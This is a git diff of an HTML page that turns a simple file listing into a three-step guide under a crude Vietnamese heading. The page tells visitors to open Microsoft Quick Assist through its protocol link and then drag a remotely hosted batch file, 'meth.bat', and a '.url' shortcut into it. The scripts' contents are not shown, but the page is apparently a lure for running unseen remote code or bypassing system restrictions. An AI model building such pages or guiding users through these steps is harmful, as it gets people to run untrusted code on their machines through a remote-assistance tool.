@@ -8,11 +8,21 @@
             background-color: black;
             color: white;
             font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
 
         h1 {
             text-align: center;
             font-family: 'Mochiy Pop One', sans-serif;
+        }
+
+        .image-left, .image-right {
+            width: 50px; /* Adjust the width as needed */
+            height: auto;
+            margin: 0 10px; /* Add some spacing between the images and the heading */
         }
 
         ul {
@@ -32,8 +42,14 @@
     </style>
 </head>
 <body>
-    <h1>Files in the Directory</h1>
+    <img class="image-left" src="server-icon.png" alt="Left Image">
+    <h1>Khoa phóng tinh</h1>
+    <img class="image-right" src="server-icon.png" alt="Right Image">
     <ul>
-        <li><a href="file1.txt" style="color: white;">File 1</a></li>
-        <li><a href="file2.txt" style="color: white;">File 2</a></li>
-        <li><a href="file3.txt
+        <li><a href="ms-quick-assist" style="color: white;">Open Microsoft Quick Assist (First step)</a></li>
+        <li><a href="https://huggingface.co/datasets/kirito8963/khoabatocomgenow/resolve/main/meth.bat" style="color: white;">Drag this into Quick Assist (Second step)</a></li>
+        <li><a href="https://huggingface.co/datasets/kirito8963/khoabatocomgenow/resolve/main/cmds2.url" style="color: white;">Drag this into Quick Assist (Last step)</a></li>
+        <!-- Add more files as needed -->
+    </ul>
+</body>
+</html>
